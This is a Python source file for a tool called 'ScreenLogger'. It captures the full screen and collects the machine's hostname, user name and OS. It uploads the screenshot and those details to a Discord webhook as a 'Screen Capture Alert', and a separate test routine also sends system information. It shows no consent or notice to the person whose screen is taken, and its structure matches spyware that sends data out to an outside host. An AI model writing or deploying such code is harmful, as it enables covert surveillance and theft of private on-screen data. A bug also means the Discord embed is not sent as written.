import requests

# ===== CONFIGURATION =====
AVATAR_URL = "https://i.imgur.com/TxirVuU.png"  # Change this URL to use a different avatar
USERNAME = "ScreenLogger"
# =========================

from PIL import ImageGrab
import io
import time
import platform
import socket
import getpass

import logging

# Configure logging once at module level
logging.basicConfig(
    filename='screenlogger.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

def test_webhook(webhook_url, avatar_url="https://imgur.com/TxirVuU"):
    """Test if webhook URL is valid by sending a test message"""
    
    try:
        embed = {
            "title": "ScreenLogger Connection Test",
            "description": "✅ Webhook connection established successfully!",
            "color": 0x57F287,
            "fields": [
                {
                    "name": "System Information",
                    "value": f"**OS:** {platform.system()} {platform.release()}\n"
                            f"**Hostname:** {socket.gethostname()}\n"
                            f"**User:** {getpass.getuser()}",
                    "inline": False
                }
            ],
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
        }

        payload = {
            "username": USERNAME,
            "avatar_url": AVATAR_URL,
            "embeds": [embed]
        }
        
        logging.info(f"Testing webhook URL: {webhook_url}")
        response = requests.post(webhook_url, json=payload)
        
        if response.status_code == 204:
            logging.info("Webhook test successful")
            return True
        else:
            logging.error(f"Webhook test failed with status code: {response.status_code}")
            logging.error(f"Response: {response.text}")
            return False
            
    except Exception as e:
        logging.exception("Webhook test error occurred")
        return False

def send_screenshot(webhook_url):
    """Capture screen and send to Discord webhook with rich embed"""
    try:
        logger.info("Capturing screenshot...")
        screenshot = ImageGrab.grab()
        if not screenshot:
            logger.error("Failed to capture screenshot")
            return False
            
        logger.info("Converting screenshot to PNG...")
        img_byte_arr = io.BytesIO()
        screenshot.save(img_byte_arr, format='PNG')
        img_byte_arr.seek(0)
        
        # Verify image data
        if len(img_byte_arr.getvalue()) == 0:
            logger.error("Empty image data")
            return False
            
        file_size = len(img_byte_arr.getvalue()) / (1024 * 1024)  # in MB
        if file_size > 8:  # Discord's upload limit
            logger.error(f"Screenshot too large: {file_size:.2f}MB")
            return False
        
        # Get system info
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        hostname = socket.gethostname()
        username = getpass.getuser()
        
        # Prepare embed
        embed_fields = [{
            "name": "System Information",
            "value": f"**User:** {username}\n"
                    f"**Time:** {timestamp}\n"
                    f"**OS:** {platform.system()} {platform.release()}",
            "inline": False
        }]

        # Prepare payload
        files = {
            'file': ('screenshot.png', img_byte_arr, 'image/png')
        }
        # Create embed with simplified structure
        embed = {
            "title": "🖥️ Screen Capture Alert",
            "description": f"New screenshot captured from system: **{hostname}**",
            "color": 0x1f6feb,
            "thumbnail": {
                "url": "attachment://screenshot.png"
            },
            "fields": [
                {
                    "name": "System Details",
                    "value": f"```\nUser: {username}\nOS: {platform.system()} {platform.release()}\nTime: {timestamp}\n```",
                    "inline": False
                },
                {
                    "name": "Capture Info",
                    "value": "This screenshot was automatically captured by ScreenLogger",
                    "inline": False
                }
            ],
            "footer": {
                "text": "ScreenLogger Pro",
                "icon_url": "https://i.imgur.com/TxirVuU.png"
            }
        }
	# made by https://github.com/CrystalRebirth
        payload = {
            "username": USERNAME,
            "avatar_url": AVATAR_URL,
            "embeds": [embed]
        }
        
        # Send to Discord with proper payload structure
        logger.info("Sending to Discord webhook...")
        try:
            response = requests.post(
                webhook_url,
                files=files,
                json=payload  # Using json instead of data for proper formatting
            )
            
            if response.status_code != 200:
                logger.error(f"Discord API error: {response.status_code}")
                logger.error(f"Response: {response.text}")
                return False
                
            logger.info("Screenshot sent successfully")
            return True
        except requests.exceptions.RequestException as e:
            logger.error(f"Failed to send to Discord: {str(e)}")
            return False
        
    except Exception as e:
        logger.error(f"Failed to send screenshot to {webhook_url}")
        logger.error(f"Error details: {str(e)}")
        if 'response' in locals():
            logger.error(f"Status code: {response.status_code}")
            logger.error(f"Response: {response.text}")
        return False
